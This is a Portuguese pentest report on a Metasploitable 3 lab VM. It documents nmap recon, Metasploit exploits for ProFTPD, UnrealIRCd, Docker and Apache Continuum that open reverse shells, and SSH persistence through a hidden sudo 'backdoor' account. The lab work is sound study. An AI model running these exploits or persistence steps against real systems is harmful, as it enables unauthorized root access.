# Relatório

## Tabela de Conteúdos
- [Relatório](#relatório)
  - [Table of Contents](#table-of-contents)
  - [1. Introdução](#1-introdução)
    - [Ferramentas](#ferramentas)
  - [2. Recon](#2-recon)
  - [3. Exploração](#3-exploração)
    - [ProFTPD](#proftpd)
    - [UnrealIRCd](#unrealircd)
    - [Docker](#docker)
    - [Apache Continuum](#apache-continuum)
  - [4. Pós-Exploração](#4-pós-exploração)
    - [Persistência com Usuário Administrativo via SSH](#persistência-com-usuário-administrativo-via-ssh)

## 1. Introdução

Este relatório documenta a exploração de uma máquina vulnerável, demonstrando a obtenção de acesso inicial, escalonamento de privilégios e estabelecimento de persistência. O objetivo é ilustrar as técnicas utilizadas para comprometer o sistema e evidenciar falhas de segurança que podem ser mitigadas.

A abordagem seguiu as seguintes etapas:

- **Recon:** Identificação de serviços e possíveis vulnerabilidades através de varredura de portas e fingerprinting dos serviços em execução.
- **Exploração:** 
  - UnrealIRCd: Ganhando acesso inicial explorando uma vulnerabilidade conhecida no serviço.
  - Escalonamento de Privilégios:
    - Docker: Aproveitando permissões do usuário para obter acesso root na máquina.
    - Apache Continuum: Explorando uma falha de execução remota de comandos para obter privilégios administrativos.
- **Pós-Exploração:**
  - Persistência: Criação de um usuário administrativo com acesso SSH para manter o controle do sistema comprometido.

### Ferramentas
- [Metasploitable 3](https://github.com/rapid7/metasploitable3)
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Nmap](https://nmap.org/)
- [Kali Linux](https://www.kali.org/)
- [Vagrant](https://www.vagrantup.com/)


## 2. Recon

Varredura completa de portas e identificação de serviços utilizando `nmap` :

Comando utilizado: `nmap -sS -p- -sV -T4 -v 192.168.0.207`

```console
Nmap scan report for 192.168.0.207
Host is up (0.00051s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http        Apache httpd 2.4.7
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.8 (2018-10-18))
6697/tcp open   irc         UnrealIRCd
8080/tcp open   http        Jetty 8.1.7.v20120910
8181/tcp closed intermapper
MAC Address: 08:00:27:42:51:79 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts: 127.0.0.1, UBUNTU, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


Varredura de vulnerabilidades com `nmap`:


Comando: `nmap -sV --script vuln -p 21,22,80,445,631,3306,3500,6697,8080 -oN metasploitable_vulns.txt 192.168.0.207`


[Resultado do comando](/doc/nmap.md)


## 3. Exploração

### ProFTPD

Para obter acesso inicial à máquina alvo, exploramos uma vulnerabilidade no serviço ProFTPD (versão 1.3.5) utilizando o módulo do Metasploit `exploit/unix/ftp/proftpd_modcopy_exec`, que explora a falha identificada como CVE-2015-3306.

**Configuração do Módulo**  
  

```console
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.0.207    yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                         ng-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/html    yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.156    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/sh          yes       The system shell to use


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5
```

**Resultados Obtidos**  

Foi aberta uma sessão de shell que evidenciou o acesso inicial com o usuário www-data:

```console
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
[*] Started reverse TCP handler on 192.168.0.156:4444 
[*] 192.168.0.207:80 - 192.168.0.207:21 - Connected to FTP server
[*] 192.168.0.207:80 - 192.168.0.207:21 - Sending copy commands to FTP server
[*] 192.168.0.207:80 - Executing PHP payload /SPkWnJ.php
[+] 192.168.0.207:80 - Deleted /var/www/html/SPkWnJ.php
[*] Command shell session 3 opened (192.168.0.156:4444 -> 192.168.0.207:37890) at 2025-03-06 10:22:46 -0500

whoami
www-data

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

hostname
ubuntu

uname -a
Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

pwd
/var/www/html
```
Esse acesso inicial permitiu a enumeração dos usuários e do sistema, possibilitando a identificação de outros pontos vulneráveis para escalonamento de privilégios.

**Utilização do Meterpreter**

Após obter a shell com o usuário `www-data`, atualizamos a sessão para Meterpreter utilizando o módulo `post/multi/manage/shell_to_meterpreter`. Essa atualização ampliou significativamente as opções de pós-exploração, permitindo uma flexibilidade maior para executar comandos do sistema, redirecionar portas e automatizar a coleta de informações.



```console
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  3         shell cmd/unix                                   192.168.0.156:4444 -> 192.168.0.207:37890 (192.168.0.207)
  4         meterpreter x86/linux  www-data @ 192.168.0.207  192.168.0.156:4433 -> 192.168.0.207:53807 (192.168.0.207)

msf6 post(multi/manage/shell_to_meterpreter) > sessions 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer     : 192.168.0.207
OS           : Ubuntu 14.04 (Linux 3.13.0-24-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: www-data


meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:104:65534::/var/lib/nfs:/bin/false
vagrant:x:900:900:vagrant,,,:/home/vagrant:/bin/bash
dirmngr:x:105:111::/var/cache/dirmngr:/bin/sh
leia_organa:x:1111:100::/home/leia_organa:/bin/bash
luke_skywalker:x:1112:100::/home/luke_skywalker:/bin/bash
han_solo:x:1113:100::/home/han_solo:/bin/bash
artoo_detoo:x:1114:100::/home/artoo_detoo:/bin/bash
c_three_pio:x:1115:100::/home/c_three_pio:/bin/bash
ben_kenobi:x:1116:100::/home/ben_kenobi:/bin/bash
darth_vader:x:1117:100::/home/darth_vader:/bin/bash
anakin_skywalker:x:1118:100::/home/anakin_skywalker:/bin/bash
jarjar_binks:x:1119:100::/home/jarjar_binks:/bin/bash
lando_calrissian:x:1120:100::/home/lando_calrissian:/bin/bash
boba_fett:x:1121:100::/home/boba_fett:/bin/bash
jabba_hutt:x:1122:100::/home/jabba_hutt:/bin/bash
greedo:x:1123:100::/home/greedo:/bin/bash
chewbacca:x:1124:100::/home/chewbacca:/bin/bash
kylo_ren:x:1125:100::/home/kylo_ren:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
avahi:x:107:114:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/false
```

**Referências**

- MITRE – CVE-2015-3306: https://www.cve.org/CVERecord?id=CVE-2015-3306

- Rapid7 – Módulo do Exploit: https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/

- [Detalhamento](/doc/proftp.md)


### UnrealIRCd

Para obter acesso inicial à máquina alvo por meio do serviço IRC, exploramos a backdoor presente no UnrealIRCd (versão 3.2.8.1) utilizando o módulo do Metasploit `exploit/unix/irc/unreal_ircd_3281_backdoor`. Essa vulnerabilidade permite a execução de comandos arbitrários via a conexão IRC, possibilitando a abertura de uma shell com privilégios superiores.

**Configuração do Módulo**  


```console
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.0.207    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   6697             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.156    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

**Execução do Exploit:**

Ao executar o comando exploit, o módulo se conectou à porta 6697 do alvo, enviou o comando de backdoor e, após a comunicação entre os sockets, foi aberta uma shell com o usuário `boba_fett`:

```console
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP double handler on 192.168.0.156:4444 
[*] 192.168.0.207:6697 - Connected to 192.168.0.207:6697...
    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
    :irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.0.207:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo sx7T7iEfmuCzX2Bz;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "sx7T7iEfmuCzX2Bz\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.0.156:4444 -> 192.168.0.207:37116) at 2025-03-06 15:57:48 -0500

id
uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
```

**Referências:**

- Rapid7 – Módulo do Exploit: https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/

### Docker

Após obter acesso inicial ao sistema com o usuário `boba_fett`, foi identificado que este usuário fazia parte do grupo docker, o que permitia a execução de comandos diretamente no daemon Docker sem privilégios elevados.

```console
meterpreter > shell
Process 2889 created.
Channel 1 created.
id
uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
groups
users docker
docker ps
CONTAINER ID        IMAGE                  COMMAND             CREATED             STATUS              PORTS               NAMES
65967e577dde        7_of_diamonds:latest   "/bin/bash"         4 years ago         Up 6 hours                              7_of_diamonds
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
7_of_diamonds       latest              889e19a44bad        4 years ago         73.6MB
ubuntu              latest              d70eaf7277ea        4 years ago         72.9MB
```

**Configuração do Módulo**
Foi utilizado o módulo `exploit/linux/local/docker_daemon_privilege_escalation`, que permite a execução de um contêiner privilegiado e, consequentemente, a obtenção de acesso root no sistema:


```console
Module options (exploit/linux/local/docker_daemon_privilege_escalation):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.156    yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port

```
**Execução do Exploit**

O exploit foi executado para iniciar um contêiner Docker privilegiado e fornecer acesso como root:

```console
sf6 exploit(linux/local/docker_daemon_privilege_escalation) > run
[*] Started reverse TCP handler on 192.168.0.156:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Docker daemon is accessible.
[+] The target is vulnerable.
[*] Writing payload executable to '/tmp/vfmAjYnRWU'
[*] Executing script to create and run docker container
[*] Sending stage (3045380 bytes) to 192.168.0.207
[+] Deleted /tmp/vfmAjYnRWU
[*] Meterpreter session 3 opened (192.168.0.156:5555 -> 192.168.0.207:59030) at 2025-03-07 12:48:27 -0500
[*] Waiting 60s for payload

meterpreter > sysinfo
Computer     : 192.168.0.207
OS           : Ubuntu 14.04 (Linux 3.13.0-24-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root

meterpreter > shell
Process 3518 created.
Channel 1 created.

id
uid=1121(boba_fett) gid=100(users) euid=0(root) groups=0(root),100(users),999(docker)
groups
users docker
```
A exploração foi bem-sucedida, e um novo Meterpreter com privilégios de `root` foi obtido.


### Apache Continuum

Foi identificado que o serviço Apache Continuum estava rodando na porta 8080 do alvo. Utilizamos o módulo do Metasploit `exploit/linux/http/apache_continuum_cmd_exec`, que explora uma vulnerabilidade nas versões ≤ 1.4.2 do Apache Continuum para permitir a execução arbitrária de comandos.

**Configuração do Módulo:**

```console
msf6 exploit(linux/http/apache_continuum_cmd_exec) > show options

Module options (exploit/linux/http/apache_continuum_cmd_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.0.207    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    8080             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.156    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Apache Continuum <= 1.4.2
```
**Execução do Exploit:**  
Ao executar o exploit, o payload foi injetado com sucesso e uma conexão reversa foi estabelecida, resultando na abertura de uma sessão Meterpreter com privilégios de root.

```console
msf6 exploit(linux/http/apache_continuum_cmd_exec) > exploit
[*] Started reverse TCP handler on 192.168.0.156:4444 
[*] Injecting CmdStager payload...
[*] Sending stage (3045380 bytes) to 192.168.0.207
[*] Meterpreter session 1 opened (192.168.0.156:4444 -> 192.168.0.207:37150) at 2025-03-06 16:28:56 -0500
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > getuid
Server username: root
meterpreter > shell
Process 2576 created.
Channel 1 created.

whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```
Essa exploração permitiu obter controle administrativo total sobre o sistema, abrindo amplas possibilidades para a enumeração de informações sensíveis e execução de comandos com privilégios elevados.


## 4. Pós-Exploração

### Persistência com Usuário Administrativo via SSH

Para garantir a persistência do acesso ao sistema comprometido, foi criada uma nova conta administrativa denominada `backdoor`. Essa conta foi configurada com privilégios de sudo, permitindo acesso total ao sistema, mesmo que as vulnerabilidades originais sejam corrigidas. Em seguida, foi configurado o acesso SSH sem senha por meio da implantação de uma chave pública.

**Criação da Conta Administrativa:**

```console
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor

grep backdoor /etc/passwd
backdoor:x:1126:1126::/home/backdoor:/bin/bash
```
**Configuração do Acesso SSH:**

```console
mkdir -p /home/backdoor/.ssh
chmod 700 /home/backdoor/.ssh
echo "XXXX" > /home/backdoor/.ssh/authorized_keys
chmod 600 /home/backdoor/.ssh/authorized_keys
chown -R backdoor:backdoor /home/backdoor/.ssh
```

**Teste de Acesso via SSH:**   
Utilizando a chave privada correspondente (armazenada em ~/.ssh/id_ed25519), foi realizado o teste de conexão: Utilizando a chave privada correspondente (armazenada em ~/.ssh/id_ed25519), foi realizado o teste de conexão:

```console
└─$ ssh -i ~/.ssh/id_ed25519 backdoor@192.168.0.207
Warning: Identity file /home/vagrant/.ssh/id_ed25519 not accessible: No such file or directory.
The authenticity of host '192.168.0.207 (192.168.0.207)' can't be established.
ED25519 key fingerprint is XXXXX
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '192.168.0.207' (ED25519) to the list of known hosts.
backdoor@192.168.0.207's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)
```

**Verificação de Privilégios:**  
Após o login, foram executados comandos para confirmar os privilégios da conta:
```console
backdoor@ubuntu:~$ id
uid=1126(backdoor) gid=1126(backdoor) groups=1126(backdoor),27(sudo)
backdoor@ubuntu:~$ sudo id
[sudo] password for backdoor: 
uid=0(root) gid=0(root) groups=0(root)
```

Essa abordagem de persistência garante que, mesmo que o acesso original seja perdido, o invasor poderá se reconectar ao sistema utilizando a conta backdoor, que possui privilégios administrativos completos.
